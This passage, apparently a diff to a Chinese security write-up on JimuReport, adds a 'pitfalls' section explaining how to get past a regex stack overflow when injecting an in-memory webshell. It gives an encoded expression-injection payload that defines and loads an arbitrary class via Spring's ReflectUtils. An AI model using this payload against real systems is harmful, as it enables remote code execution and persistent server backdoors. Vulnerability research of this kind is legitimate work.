@@ -207,7 +207,17 @@ Content-Type: application/json
 
 ```
 
+## 坑点
 
+能继续看下来的应该也发现了一个问题，等要试图注入内存马时，会发现一个正则的栈溢出，是由于这段匹配。
+
+![image-20240819101851786](attachments/image-20240819101851786.png)
+
+解决方法也很简单，套一层编码
+
+```
+=(use org.springframework.cglib.core.*;use org.springframework.util.*;use java.net.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString(URLDecoder.decode('%79')), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));)
+```
 
 ## jimureport 低版本为什么无法解析
 
